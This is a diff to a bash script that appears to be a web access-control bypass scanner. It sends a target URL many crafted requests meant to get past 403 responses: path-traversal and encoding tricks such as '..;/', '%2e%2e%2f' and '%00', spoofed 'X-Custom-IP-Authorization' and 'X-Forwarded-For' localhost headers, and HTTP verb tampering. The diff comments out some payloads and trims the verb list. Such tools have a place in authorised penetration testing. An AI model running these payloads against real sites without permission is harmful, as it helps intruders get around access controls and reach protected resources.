@@ -82,7 +82,7 @@ function payload_Suffux(){
 		output "${1}%00" $(curl_wapper "${1}%00")
 		output "${1}..;/" $(curl_wapper "${1}..;/")
 		output "${1}%" $(curl_wapper "${1}%")
-		output "${1}?" $(curl_wapper "${1}?")
+		# output "${1}?" $(curl_wapper "${1}?")
 		output "${1}??" $(curl_wapper "${1}??")
 		output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\")
 		upper_end=${1:0:${#1}-1}$(tr '[:lower:]' '[:upper:]' <<< ${1:${#1}-1:1})
@@ -95,7 +95,7 @@ function payload_Suffux(){
 	output "${1}/;" $(curl_wapper "${1}/;")
 	output "${1}/%3f" $(curl_wapper "${1}/%3f")
 	output "${1}/%" $(curl_wapper "${1}/%")
-	output "${1}/?" $(curl_wapper "${1}/?")
+	# output "${1}/?" $(curl_wapper "${1}/?")
 	output "${1}/%00" $(curl_wapper "${1}/%00")
 	output "${1}/??" $(curl_wapper "${1}/??")
 	output "${1}/%20" $(curl_wapper "${1}/%20")
@@ -111,12 +111,12 @@ function payload_Suffux(){
 	output "${1}/%2e" $(curl_wapper "${1}/%2e")
 	output "${1}/%2e/" $(curl_wapper "${1}/%2e/")
 	output "${1}//" $(curl_wapper "${1}//")
-	output "${1}/./" $(curl_wapper "${1}/./")
-	output "${1}/../" $(curl_wapper "${1}/../")
+	# output "${1}/./" $(curl_wapper "${1}/./")
+	# output "${1}/../" $(curl_wapper "${1}/../")
 	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/")
 	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f")
 
-	output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../")
+	# output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../")
 	output "${1}/randomstr/..;/" $(curl_wapper "${1}/randomstr/..;/")
 	output "${1}/randomstr/%2e%2e/" $(curl_wapper "${1}/randomstr/%2e%2e/")
 	output "${1}/randomstr/%2e%2e%2f" $(curl_wapper "${1}/randomstr/%2e%2e%2f")
@@ -133,13 +133,13 @@ function payload_Between(){
 
 	output "${1}/%2e/${2}" $(curl_wapper "${1}/%2e/${2}")
 	output "${1}/;${2}" $(curl_wapper "${1}/;${2}")
-	output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
+	# output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
 	output "${1}/randomstr/..%2f${2}" $(curl_wapper "${1}/randomstr/..%2f${2}")
 	output "${1}/randomstr/..;/${2}" $(curl_wapper "${1}/randomstr/..;/${2}")
 	output "${1}/randomstr/%2e%2e/${2}" $(curl_wapper "${1}/randomstr/%2e%2e/${2}")
 	output "${1}/randomstr/%2e%2e%2f${2}" $(curl_wapper "${1}/randomstr/%2e%2e%2f${2}")
 	output "${1}/;/${2}" $(curl_wapper "${1}/;/${2}")
-	output "${1}/./${2}" $(curl_wapper "${1}/./${2}")
+	# output "${1}/./${2}" $(curl_wapper "${1}/./${2}")
 	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}")
 	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}")
 	output "${1}//${2}" $(curl_wapper "${1}//${2}")
@@ -167,7 +167,6 @@ function payload_Header(){
 		# fix https://www.baidu.com..;/
 		output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
 	fi
-	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL)
@@ -213,7 +212,7 @@ output "curl --ipv6 $FULL_URL"  $(curl_wapper -6 $FULL_URL)
 ####################### HTTP Methods ######################## 
 echo -e "\n${GREEN}[+] HTTP Methods...${CLEAR}"
 #DELETE disabled by default, too dangerous
-for Verb in {"OPTIONS","HEAD","GET","PUT","POST","TRACE","TRACK","PATCH","MOVE","CONNECT","LS"}
+for Verb in {"OPTIONS","HEAD","PUT","POST","TRACE","TRACK","PATCH","MOVE","CONNECT"}
 do
 	if [[ $Verb == "POST" ]]; then
 		output "$Verb \t $FULL_URL" $(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL)
